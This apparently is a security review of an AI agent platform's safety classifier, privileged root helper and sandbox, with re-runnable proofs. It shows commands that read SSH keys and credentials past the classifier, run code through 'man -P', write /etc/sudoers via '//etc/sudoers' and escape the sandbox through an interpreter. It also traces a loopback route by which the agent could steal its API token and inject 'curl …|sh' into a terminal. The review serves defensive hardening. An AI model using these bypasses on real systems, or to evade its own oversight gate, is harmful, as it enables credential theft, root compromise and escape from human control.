All bypasses confirmed. (Note: a concurrent session applied the classifier patch to the live tree mid-session and has since reverted it — my `crit_live.py` run above hit the patched 1003-line file, and `safety.patched.py` gives byte-identical verdicts.)

---

# What still gets through

## 1. The read-only table is reachable *around*, not through — four live bypasses

Run against the patched module (`scratchpad/safety.patched.py`, and against `tools/safety.py` while the patch was in-tree). Every row is `risk=safe, requires_confirmation=False, matched_rule=READ_ONLY_COMMANDS` — auto-executes:

```
/tmp/evil/ls -la                              safe   READ_ONLY_COMMANDS
./find / -name x                              safe   READ_ONLY_COMMANDS
man -P /tmp/evil/pwn ls                       safe   READ_ONLY_COMMANDS
dscl . -create /Users/pwn UserShell /bin/sh   safe   READ_ONLY_COMMANDS
cat "/Users/ericbintner/.ssh/id_ed25519"      safe   READ_ONLY_COMMANDS
cat '/Users/ericbintner/.ssh/id_ed25519'      safe   READ_ONLY_COMMANDS
cat "$HOME/.ssh/id_ed25519"                   safe   READ_ONLY_COMMANDS
cat /Users/ericbintner/.ssh/id_ed25519        high   SECRET_PATHS        (control)
```

**(a) `_is_read_only` at `safety.patched.py:798` does `head = tokens[0].rsplit("/", 1)[-1]`.** That is `basename "$1"` — the exact check the privileged-write brief calls arbitrary root code execution at `packaging/polkit/halbert-exec-helper:58` (payload E1, `["/tmp/pwn/find"]`). The classifier adopts it one layer up. `/tmp/evil/ls` is not a PATH game; it is the literal argv, and the table vouches for it. Two of the six recommendations disagree about whether a basename is an identity.

**(b) `man` is `True` in `READ_ONLY_COMMANDS` (`safety.patched.py:113`) and `man -P` executes an arbitrary program.** Verified on this machine:

```
$ printf '#!/bin/sh\necho "PWNED-VIA-MAN-PAGER euid=$(id -u)" > /tmp/evilpg/proof.txt\n' > /tmp/evilpg/pwn
$ chmod +x /tmp/evilpg/pwn
$ man -P /tmp/evilpg/pwn ls   ; echo "exit=$?"
exit=0
$ cat /tmp/evilpg/proof.txt
PWNED-VIA-MAN-PAGER euid=501
```

`EFFECTFUL_ARGS` (`:265`) has no `man` entry. `less` and `more` are `True` on the same line and carry the same class of problem via `LESSOPEN`. The table's premise — "this binary only observes" — is false for any binary that takes a program as an argument, and `-exec` is not the only spelling of that.

**(c) Quoting removes a path from the classifier's field of view entirely.** `_normalise_path` (`:283`) is fed raw whitespace-split tokens by `_paths_touched` (`:309`, `for token in segment.split()[1:]`). A token `"/Users/…/.ssh/id_ed25519"` keeps its quote characters, so `expanded.startswith("/")` is false at `:305`, and with no `cwd` it returns `None`:

```
_normalise_path('"/Users/ericbintner/.ssh/id_ed25519"')  -> None
_normalise_path('.ssh/authorized_keys')                  -> None
```

`paths` comes back empty, so **`SECRET_PATHS` and the `elevate()` bump are both skipped**, and the line falls into the read-only table. One pair of quotes defeats the entire new credential tier. This is not exotic — quoting a path is the normal thing a model does.

**(d) `args[0] in allowed` is a one-token check on binaries whose read/write distinction lives in argument two.** `"dscl": frozenset({"."})` (`:256`) vouches for every `dscl .` invocation, and `.` is the *local node* selector, not a verb — `-read` and `-create`/`-delete`/`-append`/`-passwd` all follow it.

**(e) Two segmenters, one line.** `_paths_touched` uses `_command_segments` (`safety.py:60`, quote-blind whitespace split); `_every_segment_is_read_only` uses `_shell_segments` (`:751`, quote-aware, refuses `$(`/backtick). The path analysis and the read-only verdict are computed from different tokenisations of the same string, which is how (c) exists at all.

## 2. The two tool branches the rewrite never touches

`_classify_builtin` (`tools/safety.py:648`) dispatches on tool name. The recommendation rewrites `_classify_command` and `_classify_write`. It leaves `safety.py:656-662`:

```
read_file      /Users/ericbintner/.ssh/id_ed25519   safe   conf=False  Read-only operation
read_file      /etc/shadow                          safe   conf=False  Read-only operation
cat            /Users/ericbintner/.aws/credentials  safe   conf=False  Read-only operation
list_directory /Users/ericbintner/.ssh              medium conf=False  Unknown tool: list_directory
```

`read_file`, `cat` and `read_config` are SAFE **unconditionally, path unread**. The model has a dedicated file-read tool (`executor.py:762`, `expanduser` → `abspath` → `open`). The whole `SECRET_PATHS` tier is a `run_command`-only feature, and the credential exfiltration it was written to stop has a first-class tool schema that never reaches it. Nothing in the six recommendations mentions this branch.

## 3. `write_file`: the normalisation fixed the tilde and left the worse spelling

```
write_file  .ssh/authorized_keys                     medium  conf=False
write_file  ./.ssh/authorized_keys                   medium  conf=False
write_file  /Users/ericbintner/.ssh/authorized_keys  high    conf=True   (control)
```

`_classify_write` (`safety.patched.py:930`) calls `_normalise_path(path)`, which returns `None` for a relative path with no `cwd` and falls back to `or path` — the raw string. The handler at `executor.py:838-839` then does `expanduser` → **`os.path.abspath`**, resolving against the *server process's* `os.getcwd()`. So the checked string and the opened string differ again, and this time the gate cannot close the gap: the `write_file` schema (`executor.py:183-205`) has `path`, `content`, `append`, `reason` — **no `cwd` field exists to thread**. The claimed fix ("the handler expands ~ before it opens the file") addressed the one spelling the model is least likely to emit.

Two more things the chokepoint plan's `executor.py:801 _write_file → gate.open_write` cannot carry: `ResolvedPath.write_bytes` (`utils/containment.py:98-101`) is `ftruncate(0)` + `write`, so **`append=True` is unimplementable** through the primitive, and `resolve_once` has no directory-creation path (`create=True` creates only the leaf, `:220-224`) while `_write_file` does `os.makedirs(parent)` at `executor.py:863`. A conversion that loses append and mkdir is a conversion that gets reverted to a raw `open()`.

Separately, `utils/containment.py:98` truncates in place with no fsync and no atomic replace, while `fs/containment.py:replace_atomically` in the privileged-write plan uses tmp+`rename` for exactly that reason. **Two modules named `containment.py`, different APIs, different durability, both introduced as "one primitive, used everywhere."**

## 4. `tools/safety.py` is not the classifier the terminal routes use

`_gate_command` (`terminal.py:227`) calls `check_command_safety` — a **substring list defined locally at `terminal.py:131-215`**, not `ToolSafetyFramework`. Only `SafetyTier.BLOCKED` refuses (`terminal.py:262-264`, `:327-329`); `DANGEROUS` and `CAUTION` are returned as strings and executed. After all six recommendations land there are still two independent command classifiers, and the read-only table governs only the one on the agent's `run_command` path. `POST /api/terminal/exec {"command": "/tmp/evil/ls"}` never touches `READ_ONLY_COMMANDS` at all.

## 5. The chokepoint has a loopback around it, and the `kind` check refuses nothing reachable

`SpawnRequest.kind` is `Literal["user", "oneshot"]` (`terminal.py:103`). **`"agent-pool"` is not a value this route can produce** — only `agent_pool.py:85` sets it. So "refuse when the session's kind is `agent-pool`" at `terminal.py:357`, `terminal.py:408` and `websocket.py:135` refuses exactly the sessions the route cannot create and permits exactly the ones it can.

The full chain, all of it in the tree today:

1. `POST /api/terminal/sessions {"command": "/bin/bash", "kind": "user"}` — `check_command_safety("/bin/bash")` matches no `BLOCKED_COMMANDS` entry (`terminal.py:131-139`) → spawns.
2. `GET /api/terminal/sessions` (`terminal.py:350`) publishes every session id **and its `kind`** (`session_manager.py:119-133`).
3. `POST /api/terminal/sessions/{id}/input {"data": "curl -s http://x/p|sh\n"}` → `session.write_stdin(request.data)` at `terminal.py:362`, ungated. Same at `websocket.py:135` and `terminal.py:421`.

And the T1/T4 actor can drive this: the SEC-1 credential is a file at `state_dir()/api-token`, mode `0600`, **owned by the same user the agent runs as** (`dashboard/auth.py:99-141`). Reading it is `cat <path>` — SAFE under the new table. So the agent's own gated `run_command` can spend one SAFE command to obtain the credential and then reach every route through loopback HTTP, including the three ungated `write_stdin` sinks. SEC-1 raised the bar for a browser page; it did not put the API outside the agent's reach, and no chokepoint placed at `gate.spawn_shell` or at `ToolExecutor.execute` sits between the agent and that door.

The classifier-shape brief is right that `PTYSession.write_stdin` is the shared primitive and the chokepoint brief is right that argv-not-string is the shape — but they name different fences, and neither fence is crossed by step 3.

## 6. The replacement privileged helper — verified writes

Proposed `fs/containment.py` + the `DENIED` prefix tuple, reimplemented verbatim and run against a real tree (`scratchpad/helper_crit.py`):

```
plain /etc/sudoers            -> REFUSED by DENIED
DOUBLED SLASH //etc/sudoers   -> WROTE .../etc/sudoers (mode 644)
inner double /etc//sudoers    -> WROTE .../etc/sudoers (mode 644)
sudoers.d entry  //…/sudoers.d/pwn -> WROTE .../etc/sudoers.d/pwn
/etc/passwd (not in DENIED)   -> WROTE .../etc/passwd
unit file (not in DENIED)     -> WROTE .../etc/systemd/system/x.service
setuid-thing                  -> WROTE (mode 4755)

sudoers now: 'PWNED\n'
setuid-thing mode now: 4755
```

**(a) `//etc/sudoers` defeats `DENIED`.** The check is `path.startswith(d)` on the caller's raw string; `open_parent` then does `[p for p in path.split("/") if p]`, silently collapsing the empty component, walks to the same inode, and `resolved` prefixes cleanly against the root. The denylist and the opener disagree about the spelling — *the same defect the recommendation was written to eliminate*, moved from the allowlist to the denylist. `pkexec halbert-config-write //etc/sudoers` is root.

**(b) The denylist is an enumeration inside a wholesale `/etc` allowlist, and it misses the obvious.** Not in `DENIED`: `/etc/passwd` (a `pwn:$6$…:0:0::/root:/bin/sh` line with a known hash is `su pwn` → root), `/etc/group` (append yourself to `sudo`/`wheel`), `/etc/systemd/system/*.service`, `/etc/ld.so.conf` (only `.preload` and `.conf.d/` are denied; `ld.so.conf` carries `include` directives), `/etc/profile`, `/etc/profile.d/`, `/etc/environment`, `/etc/cron.daily/`, `/etc/cron.hourly/`, `/etc/security/`, `/etc/nsswitch.conf`, `/etc/ssh/sshd_config`. And the *reads*: `/etc/ssh/ssh_host_*_key` is a root-only file the `read` verb hands over.

**(c) Two of the three allowed roots are permanent root by construction.** `/usr/lib/systemd/system` is in `ROOTS`, so writing `ExecStart=/tmp/pwn` into any unit there is authorized, no denylist entry involved. `/var/lib` covers `/var/lib/dpkg/info/*.postinst`. A denylist cannot fix an allowlist that already contains the target.

**(d) `stat.S_IMODE` preserves setuid onto attacker content.** `replace_atomically` reads the old mode and `os.fchmod(tfd, mode)`s it onto the new file — verified above, `4755` survives. Nothing masks `S_ISUID`/`S_ISGID`.

**(e) The root helper `import`s a library the unprivileged user owns.** `halbert-config-helper` is `#!/usr/bin/python3` doing `from halbert_core.fs.containment import …` as root under pkexec. `scripts/install-linux.sh:117-124` installs with **`pip3 install --user`**, falling back to `pip3 install --user -e "halbert_core[dashboard]"` — an editable install into `site.getusersitepackages()` = `~/Library/Python/3.10/lib/python/site-packages` (Linux equivalent `~/.local/lib/python3.X/site-packages`). pkexec strips `PYTHONPATH`, so as root that import resolves to nothing and the helper `ImportError`s on every invocation — the privileged path is dead on a standard install. The only way to make it resolve is a system-wide install; do that the documented way (`-e`) and root's `sys.path` gains a `.pth` pointing at the repo working tree, which the agent can write. That is `get_file_helper_path()`'s `Path(__file__).parent×5 / packaging/polkit/...` entry (`editor.py:174`) — the one §4 of the same recommendation says to delete — reintroduced through the import system. Pinning `_HELPER` to one absolute path fixes the *program* and leaves its *library* on a search path.

## 7. The sandbox

**(a) `(deny process-exec (subpath writable))` is defeated by naming the interpreter.** Against the recommendation's own `sb/final.sb`:

```
$ sandbox-exec -f final.sb /private/tmp/sbxw/y.sh
sandbox-exec: execvp() of '/private/tmp/sbxw/y.sh' failed: Operation not permitted
$ sandbox-exec -f final.sb /bin/sh /private/tmp/sbxw/y.sh
INTERPRETER-BYPASS-RAN
```

The `bad interpreter: Operation not permitted` result offered as evidence that "noexec holds" only covers `execve` of the file itself. `sh script`, `python3 script`, `perl script` all read the writable directory (which is in the read set by construction) and run it.

**(b) `resolve_writable` and "cwd must be in the read set" are mutually exclusive.** `resolve_writable` (sandbox-fail-direction) drops anything not beneath `data_dir()`/`state_dir()`/`log_dir()`/`tempfile.gettempdir()`. The seatbelt profile is deny-by-default and derives its read rules from `readable + writable`. So a `/exec` with `cwd=/etc/nginx` or `cwd=~/projects/foo` — the ordinary case — gets its cwd dropped from the writable set, therefore from the read set, therefore:

```
$ cd /private/tmp/usercwd && sandbox-exec -f final.sb /bin/ls .
ls: .: Operation not permitted
```

Composing the two recommendations breaks every cwd outside the instance's own directories. And `/exec` currently passes `writable = [request.cwd]` (`terminal.py:268`) — caller-supplied in the same request as the command — so the two plans also disagree about whether `cwd` is trusted input.

**(c) Three answers to the network question.** sandbox-fail-direction keeps `(allow file-read*)` and leaves network denied; seatbelt makes reads deny-by-default and network an `allow_network` opt-in; the chokepoint plan says to add `(allow network*)` unconditionally "to preserve today's `/exec` behaviour". Three different `_seatbelt_profile` bodies are proposed for one function, and the chokepoint version re-opens the egress the other two close.

**(d) `agent_pool` cannot be wrapped at spawn regardless.** `_POOL_SHELL = "bash --norc --noprofile"` (`agent_pool.py:38`) is spawned once and every command arrives later as `write_stdin(block_cmd)` (`:264`) where `block_cmd` is `({cwd_prefix}eval {shlex.quote(command)});` (`:236-239`). `agent_pool.py:169` publishes `"sandboxed": False` honestly. `ToolSafetyFramework().classify()` is called at `:155` — but only to set a display flag, and it is called **without `cwd`**, so the display verdict and the gate verdict are computed from different inputs the moment cwd threading lands.

## 8. Two side effects nobody costed

**`integrations/voice_auth_gate.py:201` calls `gate.classify(action, {})` — empty args.** For `run_command` that is `command=""`, which under the new default is:

```
classify("run_command", {}) -> high, requires_confirmation=True
```

(today: MEDIUM). `ROLE_MAX_RISK` (`role_gate.py:43`) is `{'admin':'critical','member':'high','guest':'medium','restricted':'low','unknown':'medium'}` and `RoleGate` **blocks** above the cap (`:116-132`). So the voice path flips from `ActionDecision.allow` to `require_approval` for admin and to **`deny` for guest and restricted** — silently, for every action routed through `run_command`.

**`approval/simulator.py:177-181` still executes.** `subprocess.run(f"{command} {dry_run_flag}", shell=True)`, reachable from `POST /api/settings/simulate/command` and `/simulate/tool`. A `;` or `#` in `command` makes the appended flag decorative. It is not a `run_command` call, so no version of the classifier rewrite sees it, and the chokepoint plan's census would catch it only because someone thought to look — a route whose entire contract is "do not execute" is the one place a classifier is guaranteed not to be consulted.

---

**Artifacts, re-runnable:** `scratchpad/crit.py`, `crit2.py`, `crit3.py`, `crit_live.py` (classifier), `scratchpad/helper_crit.py` (privileged helper). Live-tree run in `crit_live.py` hit `tools/safety.py` while a concurrent session had the patch applied; that session has since reverted the file (`git status` shows it clean again, 737 lines), so re-verification needs `safety.patched.py`.